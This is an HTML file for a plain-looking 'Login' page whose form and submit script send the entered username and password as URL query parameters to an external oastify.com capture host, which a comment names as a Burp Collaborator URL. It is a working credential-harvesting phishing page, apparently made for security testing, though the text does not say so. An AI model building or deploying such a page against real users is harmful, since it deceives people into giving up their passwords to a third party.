<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f0f0f0;
        }
        .login-form {
            background: #fff;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 300px;
            border-radius: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Login</h2>
        <form id="loginForm" method="GET" action="https://mvl5myyyspkh0xwacyk5718lwc23qyen.oastify.com">
            <input type="text" id="username" name="username" placeholder="Username" required><br>
            <input type="password" id="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        // Optional: If you want to manually handle the form submission with JavaScript
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from submitting normally
            
            // Capture the input values
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Build the GET URL with credentials as query parameters
            var url = 'https://mvl5myyyspkh0xwacyk5718lwc23qyen.oastify.com' + 
                      '?username=' + encodeURIComponent(username) + 
                      '&password=' + encodeURIComponent(password);

            // Send the GET request with the credentials
            window.location.href = url;  // Redirect the browser to the Burp Collaborator URL
        });
    </script>
</body>
</html>
